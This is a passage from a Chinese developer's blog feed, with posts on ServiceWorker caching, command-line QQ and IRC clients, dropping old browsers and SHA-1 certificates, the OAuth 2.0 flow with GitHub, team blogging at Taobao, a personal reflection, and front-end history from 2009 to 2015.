Barret Lee”)); &#125;, 1000); &#125;));&#125;); 由于 Fetch API 提供了对 Header 头的修改，我们几乎可以利用 ServiceWorker 实现真实 HTTP Server 的基本功能。 ServiceWorker 一定程度上改变了 Web 协作的交互模式，传统情况下，我们需要开启一个 Web Server，或者让其他人提供 HTTP Server，前后端之间交互，沟通成本比较高。而 ServiceWorker 把 HTTP Server 搬到了客户端，我们可以在浏览器上轻松 Hold 住两端的操作。这也算是 Web 技术栈融合的表现吧。 当我们的目光放在 HTTP 的交互上，ServiceWorker 会有无限的想象空间，比如对 History API 的延伸思考，跨页面共享问题，前端请求合并和分拆问题，mock 数据问题，前后端的联调问题，类 graphQL 问题，数据的缓存更新和复用问题等等。 Cache APICache API，简而言之就是一个 Request/Response 的缓存对象组，它的生命周期跟 ServiceWorker 是紧密相连的，它没有失效时间，不删除就会一直保持原样。 123caches.open('test-cache').then(function(cache) &#123; cache.add('/index.html');&#125;); 一个简单的操作，就将 /index.html 这个页面缓存了下来，如果你使用的是最新版的 Chrome，可以打开 DevTools &gt; Resources &gt; Cache Storage，多了一个 test-cache 的缓存表，表中多出一项，Request 为 http://barretlee.com/index.html, Response 为 OK。如下方式可以查看缓存内容： 12345caches.open('test-cache').then(function(cache) &#123; cache.keys().then(function(cachedRequests) &#123; console.log(cachedRequests); &#125;);&#125;); 当浏览器处于 idle（空闲） 状态的时候，会将 Cache 资源预加载到本地。这也让我想起了 link 标签中有一个 prefetch 功能，也会有同学想到 Manifest，不过这两个东西都是不能友好控制的，而 Cache 给我们带来了这样的便利。 小结我一直相当看好 Fetch API 系列相关的新接口，它的特点也很清晰，首先是基于 Promise 的实现，这个实现解决了回调和状态控制的问题，然后是提供了应用级别的接口访问，现在可以把一个 HTTP 请求作为可控的对象随意操作，无论是 Request 还是 Response 都在我们的掌握之中，同时也一定程度解决了跨页面资源共享的问题（至于跨页面通讯，我们有 postMessage 和 MessageChannel 等工具）。 目前浏览器对 Fetch API 和 ServiceWorker 的支持都是比较可观的，虽然 W3C 上的文档状态还是 Draft 模式，相信随着我们对业务需求的更加明确，对前端认知的的不断深入，这些东西将很快被定为 RFC。 本文没有对 API 的使用做深入的说明，一方面是因为这些东西能在 Google 上找到，其次，我觉得有些 API 的设计上还不够成熟，今后会有增删，感兴趣的同学可以去 W3C 提供的文档中深入学习下。 拓展阅读 http://www.html5rocks.com/zh/tutorials/file/xhr2/ http://www.web-tinker.com/article/20882.html http://davidwalsh.name/fetch http://developer.mozilla.org/en-US/docs/Web/API/Cache http://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Cache</tag>
        <tag>ServiceWorker</tag>
        <tag>Fetch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启命令行下的社交]]></title>
    <url>%2Fblog%2F2016%2F02%2F14%2F2016-02-14-mojo-webqq-and-irc%2F</url>
    <content type="text"><![CDATA[最近一直在命令行下工作，除了 Google Chrome，几乎很少接触 GUI 相关的软件。前段时间把手机上的 QQ 给卸载了，希望可以把时间凝聚在更加有价值的位置，今天突然又想起了这个软件，突发奇想，在命令行下玩弄 QQ。 在知乎和 V2ex 上搜了一番，在 github 上找到了一个还比较满意的开源项目，使用 perl 语言编写的，虽然不动 perl ，但是人家提供了丰富的 API 可以调用，于是就深入了解了下。 Mojo-Webqq 的安装和使用项目名称叫做 Mojo-Webqq，它应该算是 smartQQ 的客户端非 GUI 框架，前几年玩 Linux 的人可能对 smartQQ 比较了解，就是一个网页上跑的 QQ，不过现在已经更名为 WebQQ 了，玩耍地址：http://web2.qq.com/。 估计作者也是一个 Linux 玩家，所有的安装指南都是 Linux 上的说明，我用的 mac，也尝试按照 ReadMe 文档安装了下。 1.首先配置 cpan，直接在命令行输入 cpan 按照提示选择默认配置即可。 1$ cpan 2.然后安装 cpanm 工具 1$ can -i App:coanminus 3.使用 cpanm 在线安装 Mojo:Webqq 模块 1$ cpanm -v Mojo::Webqq 不了解 Perl 语言，也不知道 cpanm 是个什么东西，估计跟 Nodejs 的 npm 是一样的，包管理工具。 如果期间安装失败，很可能是某个依赖包安装不成功，这个时候多留意下错误提示，然后 google 搜索怎样安装才是正确的姿势。 使用方式就比较简单了，创建一个实例跑起来： 1234567891011121314#!/usr/bin/env perluse Mojo::Webqq;my ($qq,$host,$port,$post_api);$qq = 12345678; #修改为你自己的实际QQ号码$host = "0.0.0.0"; #发送消息接口监听地址，修改为自己希望监听的地址$port = 5000; #发送消息接口监听端口，修改为自己希望监听的端口$post_api = 'http://xxxx'; #接收到的消息上报接口，如果不需要接收消息上报，可以删除此行my $client = Mojo::Webqq-&gt;new(qq=&gt;$qq);$client-&gt;login();$client-&gt;load("ShowMsg");$client-&gt;load("Openqq",data=&gt;&#123;listen=&gt;[&#123;host=&gt;$host,port=&gt;$port&#125;], post_api=&gt;$post_api&#125;);$client-&gt;run(); 上述代码保存成 xxxx.pl 文件，然后使用 perl 来运行，就会完成 QQ 登录并在本机产生一个监听指定地址端口的 http server，发送好友消息的接口调用示例： 1curl http://127.0.0.1:5000/openqq/send_message?qq=xxxxx&amp;content=hello 具体可以翻阅 文档说明 IRC 相关学习以前玩 Linux 的时候就接触过一些 IRC 的客户端，当时感觉找到了这个世界对程序员开放的窗口，各种技术 Channel，各种交流，很是激动（当然，现在不以为然）。 Google 找了下网上的推荐，一般都是使用 Weechat 或者 irssi。两个软件的安装都比较麻烦，依赖了很多软件包，不说安装和编译时间，就依赖软件包的下载时间就有半小时。 先选用的 Weechat ，安装好了之后，死活调不好中文设置，不知道这样是不是正确的： 1/charset decode GB2312 反正我是没搞好，但是学会了 IRC 的基本使用。后面还是改用成 irssi，展示没有 weechat 友好，不过默认支持中文输入。 IRC 的使用，我觉得也不用太多地去看文档，进入交互命令行之后，键入 /help，系统会把所有的命令都打印出来，然后你感觉应该用哪个就去继续学习就行了，比如连接到一个频道，可以键入 1/help server 或者 1/help connect 这些关键词都是从 /help 中找到的，以 weechat 为例，给出几个设置命令以供入门。 12345678# 添加一个 server/server add free node chat.freenode.net# 自动链接到 freenode/set irc.server.freenode.autoconnect on# 设置 nicks，username，realname/set irc.server.freenode.nicks “nickname”/set irc.server.freenode.username “username”/set irc.server.freenode.realname “realname” 输入框中键入 /connect freenode 就可连接到 freenode 的服务器,输入 /join #javascript 就可以加入到 #javascript 群组里了。 1234# 自动认证 nickname/set irc.server.freenode.command &quot;/msg nickserv identify xxxxxx&quot;# 自动加入群组/set irc.server.freenode.autojoin &quot;#channel1,#channel2&quot; 对鼠标的支持： 1234# 启动鼠标支持/moune enable# 打开时就支持/set weechat.look.mouse on 更多文档，可以在 google 中检索下。 有好多天没有码字了，今天学习的主题是 Mojo-Webqq 和 IRC，就先说这么多，后续会把每天学习和关注的知识点都记录下，方便自己，也方便他人。]]></content>
      <categories>
        <category>工具</category>
        <category>网络技术</category>
        <category>Linux</category>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Mojo-WebQQ</tag>
        <tag>IRC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016，低版本浏览器活不过这一年]]></title>
    <url>%2Fblog%2F2016%2F01%2F14%2F2016-01-14-update-your-browser%2F</url>
    <content type="text"><![CDATA[公司在 15 年下半年完成了全站的 https 升级工作，完成时对外宣称「我们是目前为止唯一一家全站启用 https 的电商公司」，这是一份荣誉，全站 https 意味着在技术上更大程度地保障了消费者的信息和交易安全。 有一个消息也点燃了大家心中的另一个激情：“所有证书供应商从 16 年 1 月 1 日开始不再签发 SHA-1 签名的证书”，我们很早就看到 https 网页在 Firefox 的控制台中一堆黄色警报，警告 SHA-1 证书不安全。但是升级到 SHA-256 之后，会出现一些问题，部分浏览器会打不开网页，只能引导这些用户升级他们的浏览器。 但是让用户升级浏览器，何止这一个理由呀！ 低版本浏览器安全堪忧有这么几则背景： 从 16 年 1 月 20 号开始，微软不再支持 IE7/8 的升级（14 年 4 月 8 号就停止了对 IE6 的升级支持），对于这部分用户如果不升级到最新的浏览器，未来如果报出漏洞，可能会导致用户数据出现泄漏。 SHA-1 签名的证书被证明已经可以在短时间内破解，所有证书供应商从 16 年 1 月 1 日开始不再签发 SHA-1 签名的证书，所有浏览器和操作系统也会将 SHA-1 证书标记为不安全。 SSLv3 已经诞生了 18 年，最近公开的 POODLE 攻击也基本宣告 SSLv3 不再安全，并且 IETF 已经将 SSLv3 作为不安全的算法。 对低版本浏览器的兼容，不仅仅让前端工程师头疼，也让很多运维同学和安全同学苦恼，因为低版本的浏览器不支持 HSTS（出现对 https 的劫持攻击问题）、前向加密（RSA 交换的密钥未来可以被破解）、TLS1.2、SNI、session ticket、OCSP stapling 等特性。 这段时间，微软不断爆出新闻，通知用户，不再为 IE11 以下版本的浏览器和 win8.1 版本以下的系统提供技术支持。在这个大数据交互为背景的互联网时代，一个安全漏洞就可能让大面积的开发者捉襟见肘。 国内大公司的反应BAT 三巨头，我就说说阿里巴巴吧，毕竟是自己服务的公司。 阿里巴巴也在逐步去除对 IE6、7 浏览器的支持，并且逐步将 PC 端的 SHA-1 签名证书和 SSLV3 算法下线，可以看到有些客户端访问阿里巴巴的页面会跳转到这个链接：http://www.taobao.com/markets/tbhome/ali-page-updater 。 并且在一些页面中，低版本的 IE 也会弹出提示框： 天猫也是如此： 最后上面提到的安全问题，受影响的不仅仅是 IE 用户，还有 Android 2.3 版本以下用户，使用这些设备的用户占比已经很低很低了。 这些内容足以看出，2016 年，那些低版本浏览器将离开中国的历史舞台了。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>低版本浏览器</tag>
        <tag>升级浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简述 OAuth 2.0 的运作流程]]></title>
    <url>%2Fblog%2F2016%2F01%2F10%2F2016-01-10-oauth2-introduce%2F</url>
    <content type="text"><![CDATA[本文将以用户使用 github 登录网站留言为例，简述 OAuth 2.0 的运作流程。 假如我有一个网站，你是我网站上的访客，看了文章想留言表示「朕已阅」，留言时发现有这个网站的帐号才能够留言，此时给了你两个选择：一个是在我的网站上注册拥有一个新账户，然后用注册的用户名来留言；一个是使用 github 帐号登录，使用你的 github 用户名来留言。前者你觉得过于繁琐，于是惯性地点击了 github 登录按钮，此时 OAuth 认证流程就开始了。 需要明确的是，即使用户刚登录过 github，我的网站也不可能向 github 发一个什么请求便能够拿到访客信息，这显然是不安全的。就算用户允许你获取他在 github 上的信息，github 为了保障用户信息安全，也不会让你随意获取。所以操作之前，我的网站与 github 之间需要要有一个协商。 1. 网站和 Github 之间的协商Github 会对用户的权限做分类，比如读取仓库信息的权限、写入仓库的权限、读取用户信息的权限、修改用户信息的权限等等。如果我想获取用户的信息，Github 会要求我，先在它的平台上注册一个应用，在申请的时候标明需要获取用户信息的哪些权限，用多少就申请多少，并且在申请的时候填写你的网站域名，Github 只允许在这个域名中获取用户信息。 此时我的网站已经和 Github 之间达成了共识，Github 也给我发了两张门票，一张门票叫做 Client Id，另一张门票叫做 Client Secret。 2. 用户和 Github 之间的协商用户进入我的网站，点击 github 登录按钮的时候，我的网站会把上面拿到的 Client Id 交给用户，让他进入到 Github 的授权页面，Github 看到了用户手中的门票，就知道这是我的网站让他过来的，于是它就把我的网站想要获取的权限摆出来，并询问用户是否允许我获取这些权限。 12345678// 用户登录 github，协商GET //github.com/login/oauth/authorize// 协商凭证params = &#123; client_id: &quot;xxxx&quot;, redirect_uri: &quot;http://my-website.com&quot;&#125; 如果用户觉得我的网站要的权限太多，或者压根就不想我知道他这些信息，选择了拒绝的话，整个 OAuth 2.0 的认证就结束了，认证也以失败告终。如果用户觉得 OK，在授权页面点击了确认授权后，页面会跳转到我预先设定的 redirect_uri 并附带一个盖了章的门票 code。 12// 协商成功后带着盖了章的 codeLocation: http://my-website.com?code=xxx 这个时候，用户和 Github 之间的协商就已经完成，Github 也会在自己的系统中记录这次协商，表示该用户已经允许在我的网站访问上直接操作和使用他的部分资源。 3. 告诉 Github 我的网站要来拜访了第二步中，我们已经拿到了盖过章的门票 code，但这个 code 只能表明，用户允许我的网站从 github 上获取该用户的数据，如果我直接拿这个 code 去 github 访问数据一定会被拒绝，因为任何人都可以持有 code，github 并不知道 code 持有方就是我本人。 还记得之前申请应用的时候 github 给我的两张门票么，Client Id 在上一步中已经用过了，接下来轮到另一张门票 Client Secret。 12345678910// 网站和 github 之间的协商POST //github.com/login/oauth/access_token// 协商凭证包括 github 给用户盖的章和 github 发给我的门票params = &#123; code: &quot;xxx&quot;, client_id: &quot;xxx&quot;, client_secret: &quot;xxx&quot;, redirect_uri: &quot;http://my-website.com&quot;&#125; 拿着用户盖过章的 code 和能够标识个人身份的 client_id、client_secret 去拜访 github，拿到最后的绿卡 access_token。 1234567// 拿到最后的绿卡response = &#123; access_token: &quot;e72e16c7e42f292c6912e7710c838347ae178b4a&quot; scope: &quot;user,gist&quot; token_type: &quot;bearer&quot;, refresh_token: &quot;xxxx&quot;&#125; 4. 用户开始使用 github 帐号在我的页面上留言12// 访问用户数据GET //api.github.com/user?access_token=e72e16c7e42f292c6912e7710c838347ae178b4a 上一步 github 已经把最后的绿卡 access_token 给我了，通过 github 提供的 API 加绿卡就能够访问用户的信息了，能获取用户的哪些权限在 response 中也给了明确的说明，scope 为 user 和 gist，也就是只能获取 user 组和 gist 组两个小组的权限，user 组中就包含了用户的名字和邮箱等信息了。 12345// 告诉我用户的名字和邮箱response = &#123; username: &quot;barretlee&quot;, email: &quot;barret.china@gmail.com&quot;&#125; 整个 OAuth2 流程在这里也基本完成了，文章中的表述很粗糙，比如 access_token 这个绿卡是有过期时间的，如果过期了需要使用 refresh_token 重新签证。重点是让读者理解整个流程，细节部分可以阅读 RFC6749 文档。 希望对你理解 OAuth 2.0 有帮助。（本文完）]]></content>
      <categories>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>OAuth2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简述淘宝团队的技术沉淀和对外分享]]></title>
    <url>%2Fblog%2F2016%2F01%2F08%2F2016-01-08-share-in-team%2F</url>
    <content type="text"><![CDATA[去年下半年开始，我负责淘宝前端团队（Taobao FED）的对外运营，比较重要的点就是「团队博客」，坚持了三个多月的每日一文，很多朋友不禁惊叹，“你们实在太高产！”。 经常写博客的人都知道，写一篇有价值的技术文章是一件挺费时费力的事情。很多善于分享的同学，也只能做到每月两三篇，由于业务压力，偶尔一两个月还没有产出。倘若看到有人每天发一篇高质量的文章，下巴当然会掉到地上。撑起大拇指的同时，心里也在嘀咕，为何可以持久保持？是不是写文章也背了 KPI？最近也有不少人向我取经。 团队分享氛围的形成分享和沉淀是团队基础建设的一部分，没有分享没有记录，很多交流和学习的东西就沉淀不下来。一个没有沉淀的团队，新成员需要长时间的踩坑和磨合才能得以成长，团队各个小组的信息互通不顺畅、信息不对称，同时也难以对外形成一定的影响力。 14 年 3 月份开始，我来淘宝这边实习。淘宝这边的东西太多了，基础框架、开发工具、前端规范、安全守则、搭建平台、业务沟通等等，对一个新人来说，了解并掌握团队整个一套真不是实习两个月就能搞定的。所以学习成了一个最大的主题，每天都是学习 &amp; 基本的业务沟通，会有很多疑问，也会不断地去提问。 实习生没有 KPI，跟正式员工的差异在于，除了要投入到业务生产之中，还要不断地学习并融入到这个团队，所以做淘宝的实习生也是比较辛苦的事情。虽说没有 KPI，但是也得写写实习规划，写一些自己对自己的期望，Team Leader 也会对实习生有一些期望，两个期望之间有很多契合点，比如了解业务，有思考，有沉淀，有分享。刚开始，实习生难以在业务开发中出技术亮点，不过一些好的想法和思考会引起团队其他同学的关注，也会给自己带来机会，比如 Team Leader 会把你放到更加适合你的位置上锻炼你。 阿里巴巴有很多很多很多个部门，每个部门（BU）都会有自己的技术团队，前端团队、后端团队、PE、QA 等等，内部有一个博客平台，这个平台上有以圈子为维度聚合的，如 Node.js 糯米圈、全站 HTTPS、JVM 交流答疑、跨终端等等几百个圈子；也有以 BU 为维护聚合的，每个 BU 的 Team Leader 创建圈子后将整个团队的人员拉进来。很多人在这个博客平台上分享，公司几万人，可以想象这里沉淀的内容体量有多么庞大，知识领域包括：Java核心技术, 前端与交互设计, 安全与风控, 系统软件, 测试技术, 编程语言, 架构, 数据存储与数据库, 引擎技术, 项目管理与软件工程, 移动开发与客户端, 系统研发与运维, 互联网产品及应用, 分布式系统与计算, 开发框架与中间件, 算法, 网络与数据通信等等。 所以几乎任何问题都能够在这里找到答案，也能在众多圈子中找到帮助你解决问题的人。有人看就会有人写，有人点赞，有人收藏，有人评论；除了页面上的分享，还有 BU 之间的交流，团队之间的沟通，前后端之间的相互学习；还有前端夜校、集团夜校，下班了不想走就参加夜校培训学习。阿里巴巴在技术交流这一块做的还是相当不错的。 团队知识沉淀的对外传播在一个善于分享的团队中，时间久了自己也会被薰陶成一个善于分享的人。无论是业务的思考还是技术的学习，很多同学会把好的东西写下来分享给其他人，在分享的过程中有人跟你一起交流，指出你思考中的不完善的地方，相互提高。这是老大们期望看到的结果，他们也会主动参与和推动，经常分享一些想法引来讨论，这样很利于带动团队的共同进步。 内部博客平台上很多东西是不能对外的，业务耦合度太高，并且参合了对业务的思考中很多数据，所以对外传播也需要有一个流程。 淘宝 FED 的博客是静态发布的，托管在 github/gitcafe 上，为了更好地筛选、过滤和检测博客内容，我做了一个博客后台，对博客文章格式和图片做了硬性的规定，比如： 文章必须有题图，题图尺寸为 900x500 文章格式符合文档通用规范，针对规范的细节，开发了检测工具，比如全角和半角的使用、中英文之间的空格、专有词汇的大小写等等 文章只有 Team Leader 才有权限发布到后台系统，所有 TL 都必须看一遍发布的文章，并且对数据脱敏，确保对外发布是安全的。博客后台的所有操作都不会同步到外网，最后会由我确认一遍，然后手动同步。 这里可以给大家推荐几个没有版权问题的图片下载地址： http://publicdomainarchive.com/ http://www.gratisography.com/ http://unsplash.com/ http://picjumbo.com/ http://pixabay.com/ 规范和流程只是最后环节，重点还是需要团队有人分享。 最后工作日每日一文，已经坚持三个多月了。当初规划的发布时间是： 周一：web 开发 周二、周四：node 周三：无线 周五：工具平台 时而：团队生活 这个频率对一个团队来说，也是够呛的。有的时候也会出现某个分类下，同学们的产出并不多，比如无线方面。从中也能体现了一个问题，那就是团队在无线方面的钻研还不够深入。 我每天都会花费 10-40 分钟来传播这些内容，在 QQ 群，朋友圈和微博上，传播的目的很简单，跟大家交流，收集大家的意见，同时也会对内容做一些答疑。 后续发布频率会降低一些，每周 2-3 篇，保证质量，也保证热度。]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>分享</tag>
        <tag>团队</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[时间都去哪儿了？]]></title>
    <url>%2Fblog%2F2016%2F01%2F03%2F2016-01-03-where-is-time-goning%2F</url>
    <content type="text"><![CDATA[记得当初 17 岁刚进大学的时候，心中还充满了优越感，心想着：“青春啊，我要肆意挥洒这几年。” 没想到还没来得及挥洒，大学就已经过去了，没有多少留恋的东西，很平静地就过去了；当我走进社会，走进大公司实习的时候，心中又是一阵欢喜，“呀，都是师兄师姐辈份的哈~”，然而这一阵欢喜还没开始，时光荏苒两年飞逝，已经不敢再称自己为小鲜肉了… 我到现在还以为自己是去年毕业的，仔细回忆，中间其实还隔了一年。晃晃悠悠的，时间都去哪里了？我又从这些时间的夹缝中获得了什么？ 漂浮的状态以前手机里头从来没有游戏，最近装了一个斗地主，由于运气太好，欢乐豆一直输不完，结果很多闲暇时间扔进了游戏堆；以前习惯不吃饭或者不睡觉，用一段很长的时间完成一个作品或者项目，现在按时吃饭，基本按时睡觉，大段的时间没有了，剩下的是零碎的时间片，而自己又不善于利用时间片；以前总是点头，你开心我满意。而现在总是摇头，摇一次头的代价就是更多的点头，点头和摇头之间，人也变得迷迷糊糊… 这一年，自己的情绪就像是一根波浪线，跌宕起伏，时而激情澎湃，时而低靡沉沦。在公司上班，拟定 KPI，照着大纲过日子；假日里的休闲，牵着女伴的手四处闲荡。有明确的方向，但是似乎也不怎么明确。 每次在给自己制定目标的时候，总怕苦了自己，往松里定，弹性排列，没有紧凑感，很松散，很随性。每次遇到问题的时候，总想着能回避便回避，不能回避干它两下再回避，躲躲闪闪地过日子，解决问题的能力看似提高了，实则是积攒问题的水平更强了。很多时候，解决了一个「复杂」的问题，恨不得给自己点 100 个赞，得瑟个三五六天，然后开始解决下一个「复杂」的问题，接着继续点赞，已经被朋友圈和微博的点赞功能薰陶到了极点，玩的神魂颠倒、不能自已！ 凭着感觉过日子，这是近半年最大的感触。什么事情该做，什么事情不该做，脑子里一闪而过，结论也就出来了。可以说是思维敏捷，似乎更多的是头脑发热，瞎指挥自己的身体和嘴巴。「凭感觉」就是一种长期经验沉淀的习惯，这是一种埋藏在潜意识下的反射弧，反射弧在脑子里放多了就容易出毛病。要知道，活在自己的经验里是一件相当无趣的事情，不用思考，习惯性地动作，动作次数一多就显得特别臃肿，特别多余。 我喜欢换场景。就像念书的时候，我不喜欢总是坐在一个地方，这个月坐在第一排，下个月还让我坐在第一排，就很不习惯。我喜欢换着法去玩，有变化才会有刺激。人就是缺乏刺激才变得迟钝。 2015 年，很多时候，自己处于漂浮状态，很离散。 更加专注地做事情生活和工作中有太多重复的事情了，我要想办法融合掉。比如，我每天要花 5-20 分钟，处理团队博客的问题，催稿、发文、改文、传播、传播、再传播、自己咀嚼等，这个过程每天重复着。类似这样的流程，我要写一套自动化程序来处理。不能用编程解决的问题，要用规范、规则去处理。 还有很多重复的事情，必须每天坚持做。比如，健身，准时睡觉。 把紧急的事情和重要的事情分的更加清楚。将更多时间投入到重要的事情，这可能需要自己换一个身份。 2016 年，我打算把时间花得更加划算。只专注几件事情，做好它，一直做。 嗯，30 分钟的总结时间，就这么多，得去睡了！ 2016，加油！！！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>展望</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[近几年前端技术盘点以及 2016 年技术发展方向]]></title>
    <url>%2Fblog%2F2015%2F12%2F10%2F2015-12-10-after-framework-we-gonna-to-hug-data%2F</url>
    <content type="text"><![CDATA[Web 发展了几十个春秋，风起云涌，千变万化。我很庆幸自己没有完整地经历过这些年头，而是站在前人的肩膀上行走。Web 技术发展的速度让人感觉那几乎不是继承式的迭代，而是一次又一次的变革，一次又一次的创造。这几年的前端，更为之甚！ 我从 12 年底开始接触前端，12 年之前的前端发展情况只能从上一辈的笔触中领会。本文会盘点从 09 年开始到 15 年间前端技术的革新，同时也会从多个角度，解读近几年前端技术发展的潜在因素，其中穿插了若干对前端演进的拙见，难免会有错误和疏漏，望读者可以补充和斧正。 那些年，一度追捧，一度放弃下面，花一些篇幅简单回顾下 09 年到 15 年前端的发展历程（Update: 2016/01/03, 感谢@法海 师兄对文章部分内容的校稿，很多技术出现的时间有所偏差，但不影响阅读）。 09 年，基础类库完善，寻求突破09 年之前，JavaScript 还处于对自身语言的完善过程中，而到了 09 年，JavaScript 类库已经颇为成熟，jQuery/Prototype//Dojo 等都已经发布了好几个 stable 版本，各大类库也是相互吸收优点，不断完善并提高自身性能，然而功能上已经没有太多增加的势头。部分框架开始了思想上的转变，更加注重前端开发的组织和结构，条理性强了很多，如 YUI 等。 从 ECMAScript 规范的争执，开启了浏览器引擎大战，各大厂商也趁机瓜分 IE 份额，Chrome 和 Firefox 在这场战役中取得大胜，V8 也敲响了前端的大门。为了迎合市场的激烈竞争，IE 开始了升级之旅，09 年初发布 IE8，全面兼容 CSS2.1。 而此时，Node.js 和 3G Mobile 这两只巨兽开始浮出水面，Web 标准也开始向 HTML5、ECMAScript5.0 靠拢。 10 年，看齐标准，关注 Web 性能毫无疑问，这一年，各大巨头都看清了 HTML5 是 web 发展的未来，在保留原来前端技术的状态下，都簇拥着拉扯 HTML5 的裙摆。富客户端应用也在这一年蓬勃生长，ExtJS/Dojo 摇身变为企业级框架，各类组件化概念和产品如约而至。 延续着 09 年的变化，10 年的前端显得颇为沉寂，然而在标准的运用和推动上，各大厂商也是十分卖力。IE 9 出来了预览第三版，iPhone 的 Safari 已经能够支持众多 HTML5 内容：Canvas/Video/Audio/Geolocation/Storage/Application Cache/Web SQL Database 等。 W3C 宣布成立 Web 性能工作组，Google 和 Mozilla 纷纷推出应用商店，浏览器调试工具也丰富了起来，人们开始更多地关注开发体验和性能问题。 11 年，HTML5 扛大旗，Flash 堪忧2011 年 HTML5 的技术发展和推广都向前迈进了一大步，语义明确的标签体系、简洁明了的富媒体支持、本地数据的储存技术、canvas 等等各类技术被广泛应用。这一年，很多 web 开发者也面临一项技术的抉择，HTML5 or Flash？从 Flash Player 11.1 开始，Adobe 不再继续开发面向移动设备浏览器的 Flash 插件，积极投身于 HTML5，这意味着 Flash 技术的凋零。 这一年，HTML5 游戏火爆到了一个高潮，移动端开发工具和调试工具也日益成熟。jQuery 已经成为大小公司日常开发的标配，成千上万的 JQ 插件让网页开发变得尤为轻松，而随之而来的也是页面的臃肿和性能调优的深入探索。 Node.js 已经悄然崛起，在 github 上的访问量已经超过了 Rails，国内的云应用开始尝试使用 Node.js，Node.js 相关工具也纷纷出来。 12 年，响应式开发，工程化推进随着硬件技术的发展，各手机厂商又开始骚动起来，为了占有更多的市场，不断提高产品的性价比，体验也得到了不断的优化。借着先前两年 HTML5 刮起的东风，移动端上的 web 开发也颤抖了起来。移动端的开发挑战不亚于 PC 上对多个浏览器的支持，这一年，萌生了众多移动端框架，如 Sencha Touch/Zepto.js/JQ Mobile 等，相对 PC 端框架，它们更加轻便。 而移动端的崛起，带来了许多终端开发难题：多终端适配，多分辨率适配，远程调试等等，而随着这些难题一个个被解决，移动端生长的势头变得更加强盛。此时 Twitter 也推出了 Bootstrap， 这个前端开发工具包不仅方便了前端，也方便了后端同学，它的出现让快速建站更加简单。 编程思想的切换，迎来了 CoffeeScript 和 TypeScript，这两个预处理语言的出现又为 JavaScript 引来了不少其他方向转型过来的开发者。JavaScript 的兄弟 Node.js，也在命令行领域开拓了一片不小的疆域，甚至有动摇 Perl 和 Ruby 地位的趋势。 在前端工程化上，几个派系相互争斗，产出了 AMD、CMD、UMD 等规范，也衍生了 SeaJS、RequireJS 等模块化工具。前端在这一年很有跳跃感。 13 年，爆发式增长，百花齐放规范和标准上有不少产出。Web Components 的出现给前端开发开辟了新思路；WebDriver 规范的出来推动了自动化测试的进程，ECMAScript 6 的规范草案落地，Webapp 工作小组在这一年也是相当活跃。 Chrome 浏览器在这一年也有了很大的突破，开始支持 SPDY，使用 Blink 取代 webkit 作为 Chromium 的新渲染引擎，Chrome DevTools 的调试体验大幅度提升。这一年中，Chrome 连同其他浏览器厂商快速推动了各项草案规范的实现。 语言能力上依旧在增强，并且从 JS 开始扩散到 CSS，LESS、SASS 和 Stylus 等 CSS 预处理语言开始走俏，Web 开发变得更加紧凑。 而在无线端，应用不再局限于 Webapp，由于流畅度、性能等方面不能满足用户体验的需求，各大公司开始转向 Native 方向的研究，进而出现了 Hybrid 和 PhoneGap 的繁荣，它们为 JS 调用了提供更多的设备 API。 Node.js 大放异彩，很多公司在生产环境中使用 Node.js，同时也出现了诸如 Express、Meteor 等小巧的快速搭建 Node.js Server 的应用框架。 各浏览器的调试也是种类繁多、功能丰富，PhantomJS 在自动化测试上开始取代 Selenium，出现了众多的远程调试方案和工具。 前端工程化开始普及，各公司开始推出自己的前端集成开发解决方案。 14 年，移动端的崛起，HTML5 和 ES6 落地HTML5 正式定稿，这意味着，web page 正式演变为 web application。ES6 华丽丽走进前端，走的很稳重，它的 Module/Class 等特性已经完全让这门语言具备了开发大型应用的能力。 大而厚的基础库难以满足灵活场景，Mobile 要求极致体验，MV* 库铺卷而来，如 vue/angular/knockout 等。 Web Components 跨终端组件快速发展，移动端开发迎来一次升华。Node.js 前后端分离的流行，中间层的出现改变了前后端的合作模式。2014 是颠覆式的一年，前端发展在这一年开始形成了一个短暂的稳定格局。 15 年，观念的转变，步入前端工业化生产今年格外引人注目的框架是，类 React。Facebook 在 React.js Conf 2015 大会上推出了基于 JavaScript 的开源框架 React Native，它结合了 Web 应用和 Native 应用的优势，可以使用 JavaScript 来开发 iOS 和 Android 原生应用。在 JavaScript 中用 React 抽象操作系统原生的 UI 组件，代替 DOM 元素来渲染等。敲一次代码，能够运行在多个平台上，其优势可见一斑。除了 React ，还有手机淘宝推出的 Weex 框架，它吸收了 vue.js 的编程精华，编程风格更加简约。 在众多构建工具中，如今潇洒存活的并不多。体验完 grunt 和 browserify 后，gulp 顺势而至，尔后又出现了 webpack、jspm 等。而包管理工具，经历了 components、bower、spm 后，npm 开始主导整个市场。 Node.js 的应用已经铺天盖地，各大公司前端都把 Node.js 作为分离前后端的主要手段，并且在测试、监控等方面沉淀了大量内容。不过，这个市场是很苛刻的，Node.js 的性能难以达到 C/C++ 的水平，那么接下来要做的就是要提升性能，至少得接近 C/C++。 @法海 师兄批注：对时间点的总结是，其实很多技术方案很早就出现了，只不过没有大规模应用，因此，对于上文中时间点的谬误，你可以将语句从「xxx 出现了」改成「xxx 得到广泛应用」。其实我发现，问题在于，一个技术领域的新起和发展并不是一年内能完成的，一个技术方案的出现和广泛应用也不是一年内能落地的，所以执着于以「年」为时间点来编史，会画地为牢。 Web 规范和标准最开始，我们看到的 JavaScript 还只是一个简单的脚本语言，配合着 AJAX，在网页上翻腾了好几个年头。随着互联网趋势越来越明显，互联网业务量和业务复杂度不断增加，很多网页变得相当复杂，如让我们震惊了好一会儿的 Gmail，交互复杂，体验优良。为了更好的多人协作，代码中的 Utils 库越来越大，在这些库中，基础部分更多的是对 JavaScript 语言本身的拓展，比如给 String 加一个 repeat 函数，再加一个 trim 函数，再加一个 endWith 